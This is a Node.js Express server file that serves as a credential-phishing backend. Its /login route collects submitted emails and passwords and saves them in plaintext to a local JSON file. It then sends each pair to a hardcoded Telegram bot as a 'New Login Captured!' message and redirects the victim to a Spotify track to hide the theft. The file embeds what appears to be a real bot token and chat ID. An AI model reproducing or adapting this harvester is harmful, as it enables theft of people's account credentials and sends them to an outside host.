const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const path = require('path');

const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;
const DB_FILE = './database.json';

// --- TELEGRAM CONFIG ---
// Get these from @BotFather
const TELEGRAM_BOT_TOKEN = '8640126224:AAHxloPr3xZ5sWQAdO_OJFrTj8VJCV5NEbI';
const TELEGRAM_CHAT_ID = '7622822749';
// ------------------------

// Initialize "database" file if it doesn't exist
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify([], null, 2));
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Login route
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send('Email and password are required.');
    }

    // Read existing records
    const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));

    // Create new record
    const newRecord = {
        id: Date.now(),
        email: email,
        password: password,
        timestamp: new Date().toISOString()
    };

    // Save to "database"
    data.push(newRecord);
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log("Database write failed (common on cloud hosting), continuing with Telegram...");
    }

    // Send to Telegram
    const message = `🚀 *New Login Captured!*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n📅 *Time:* ${newRecord.timestamp}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log(`[TELEGRAM] Notification sent for: ${email}`);
    } catch (error) {
        console.error('[TELEGRAM] Error sending message:', error.message);
    }

    // Redirect to the song
    res.redirect('https://open.spotify.com/track/5ZDKPFRZC6QlJpf8bCIXTs?si=pfY2NQsWS32nJIfdsJ9-hQ');
});

app.listen(port, () => {
    console.log(`
🚀 Server is live at http://localhost:${port}
📂 Database file: ${path.resolve(DB_FILE)}
    `);
});
